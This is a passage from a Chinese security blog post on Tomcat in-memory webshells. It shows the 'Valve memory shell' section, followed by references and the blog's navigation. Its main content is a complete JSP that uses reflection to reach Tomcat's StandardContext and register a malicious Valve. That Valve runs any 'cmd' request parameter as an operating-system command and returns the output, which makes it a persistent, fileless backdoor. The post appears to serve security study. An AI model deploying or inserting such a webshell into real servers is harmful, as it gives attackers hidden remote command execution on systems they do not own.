<h4 id="Valve内存马实例"><a href="#Valve内存马实例" class="headerlink" title="Valve内存马实例"></a>Valve内存马实例</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddVavle&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从ServletContext中反射获取ApplicationContext和StandardContext</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">Valve</span> <span class="variable">valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Valve</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        standardContext.getPipeline().addValve(valve);</span><br><span class="line"></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/bitterzzZZ/MemoryShellLearn">https://github.com/bitterzzZZ/MemoryShellLearn</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10362">Tomcat 内存马（二）Filter型</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/haimishasha/p/10740606.html">Tomcat系列(4)——Tomcat 组件及架构详细部分</a></li>
<li><a target="_blank" rel="noopener" href="https://xuanjian1992.top/2019/08/13/Spring-MVC%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90(xml%E9%85%8D%E7%BD%AE)/">Spring MVC启动流程分析(xml配置)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/hao134838/article/details/109746151">从源码分析tomcat如何调用Servlet的初始化</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xyylll/p/15463635.html">tomcat内存马原理解析及实现</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">Java内存马：一种Tomcat全版本获取StandardContext的新方法</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Handlebars AST注入</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%BA%94%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">Web应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">初始化流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat"><span class="toc-number">2.</span> <span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.</span> <span class="toc-text">Tomcat体系结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E7%BB%84%E4%BB%B6%E5%85%B3%E7%B3%BB"><span class="toc-number">2.2.</span> <span class="toc-text">Tomcat组件关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">Tomcat执行流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#StandardContext"><span class="toc-number">2.4.</span> <span class="toc-text">StandardContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.5.</span> <span class="toc-text">Filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FilterChain"><span class="toc-number">2.5.1.</span> <span class="toc-text">FilterChain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.5.2.</span> <span class="toc-text">Filter内存马实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.6.</span> <span class="toc-text">Servlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#loadOnStartup"><span class="toc-number">2.6.1.</span> <span class="toc-text">loadOnStartup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.6.2.</span> <span class="toc-text">Servlet内存马实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.7.</span> <span class="toc-text">Listener内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Listener%E5%88%86%E7%B1%BB"><span class="toc-number">2.7.1.</span> <span class="toc-text">Listener分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#listenerStart"><span class="toc-number">2.7.2.</span> <span class="toc-text">listenerStart</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.7.3.</span> <span class="toc-text">Listener内存马实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Valve%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.8.</span> <span class="toc-text">Valve内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pineline"><span class="toc-number">2.8.1.</span> <span class="toc-text">Pineline</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Valve%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.8.2.</span> <span class="toc-text">Valve内存马实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>